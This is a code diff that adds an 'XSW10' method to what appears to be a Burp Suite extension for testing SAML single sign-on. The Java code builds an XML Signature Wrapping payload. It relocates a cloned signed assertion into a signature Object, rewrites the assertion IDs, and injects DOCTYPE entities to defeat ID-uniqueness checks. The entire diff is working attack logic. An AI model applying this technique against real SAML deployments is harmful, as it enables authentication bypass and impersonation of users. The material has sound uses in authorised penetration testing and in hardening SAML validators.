@@ -217,6 +217,114 @@ public class XSWHelpers {
             BurpExtender.api.logging().logToError(e);
         }
     }
+        public void applyXSW10(Document document) {
+        // Get the Response and Assertion elements.
+        Element response = (Element) document.getElementsByTagNameNS("*", "Response").item(0);
+        Element assertion = (Element) document.getElementsByTagNameNS("*", "Assertion").item(0);
+        if (response == null || assertion == null) {
+            BurpExtender.api.logging().logToError("Could not find SAML Response with Signed Message & Assertion!");
+            return;
+        }
+
+        // Get all Signature nodes.
+        NodeList sigNodes = document.getElementsByTagNameNS("*", "Signature");
+        if (sigNodes.getLength() == 0) return;
+
+        // Copy into a list since we may remove nodes during iteration.
+        List<Element> signatureList = new ArrayList<>();
+        for (int i = 0; i < sigNodes.getLength(); i++) {
+            signatureList.add((Element) sigNodes.item(i));
+        }
+
+        Element signature = signatureList.getLast();
+        NodeList refList = signature.getElementsByTagNameNS("*", "Reference");
+        String originalSignedID = null;
+        if (refList.getLength() > 0) {
+            Element ref = (Element) refList.item(0);
+            String uri = ref.getAttribute("URI");
+            originalSignedID = uri.substring(1); // remove leading '#'
+        }
+        if (originalSignedID == null) return;
+
+        Node clonedSig = signature.cloneNode(true);
+
+        NodeList allElements = document.getElementsByTagName("*");
+        Node signedElement = null;
+        for (int i = 0; i < allElements.getLength(); i++) {
+            Element el = (Element) allElements.item(i);
+            if (originalSignedID.equals(el.getAttribute("ID"))) {
+                signedElement = el.cloneNode(true);
+            }
+        }
+
+        if (signedElement == null) return;
+
+        // Remove any Signature element that is a direct child of the Response.
+        for (Element sig : signatureList) {
+            Node parent = sig.getParentNode();
+            if (parent != null) {
+                parent.removeChild(sig);
+            }
+        }
+
+        // Try to locate an Issuer node within the Response.
+        NodeList issuerList = response.getElementsByTagNameNS("*", "Issuer");
+        if (issuerList.getLength() > 0) {
+            Node issuer = issuerList.item(0);
+            // Insert the cloned signature immediately after the issuer.
+            Node parent = issuer.getParentNode();
+            Node nextSibling = issuer.getNextSibling();
+            if (nextSibling != null) {
+                parent.insertBefore(clonedSig, nextSibling);
+            } else {
+                parent.appendChild(clonedSig);
+            }
+        } else {
+            // Fallback: simply append to the Response.
+            response.appendChild(clonedSig);
+        }
+
+
+        // Create an Object element with the proper XMLDSig namespace and explicitly set xmlns.
+        Element objectNode = document.createElementNS("http://www.w3.org/2000/09/xmldsig#", "Object");
+        // force namespace to fix some errors
+        objectNode.setAttribute("xmlns", "http://www.w3.org/2000/09/xmldsig#");
+        clonedSig.appendChild(objectNode);
+        // Append a deep clone of the Assertion node to the Object node.
+        objectNode.appendChild(signedElement);
+
+        // Change the Assertion's ID attribute by appending "6093".
+        String originalAssertionID = assertion.getAttribute("ID");
+        assertion.setAttribute("ID", originalAssertionID + "6093");
+
+
+//        // Set the Response's ID attribute to a new fixed value.
+        response.setAttribute("ID", "&idViaEntity;");
+        // Look for a Signature > Object > Assertion chain inside the Response.
+        NodeList responseChildNodes = response.getChildNodes();
+        for (int i = 0; i < responseChildNodes.getLength(); i++) {
+            Node child = responseChildNodes.item(i);
+            if (child.getNodeType() == Node.ELEMENT_NODE && "Signature".equals(child.getLocalName())) {
+                // Within this Signature, search for an Object node.
+                NodeList objectNodes = ((Element) child).getElementsByTagNameNS("*", "Object");
+                for (int j = 0; j < objectNodes.getLength(); j++) {
+                    Element objectElem = (Element) objectNodes.item(j);
+                    // Within Object, search for a signed node.
+                    NodeList assertionNodes = objectElem.getElementsByTagNameNS("*", signedElement.getLocalName());
+                    if (assertionNodes.getLength() > 0) {
+                        Element objectInj = (Element) assertionNodes.item(0);
+                        // Modify its ID by prefixing with "BypassIDUniqueness".
+                        String objAssertionID = objectInj.getAttribute("ID");
+                        objectInj.setAttribute("ID", "&BypassIDUniqueness;" + objAssertionID);
+
+                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "idViaEntity", objAssertionID));
+                        doctypeEntities.add(String.format("<!ENTITY %s \"%s\">\n", "BypassIDUniqueness", "&#x50;"));
+                        break;
+                    }
+                }
+            }
+        }
+    }
 
     // Used for XSW9
     private Document selfSignAssertion(Document document) {
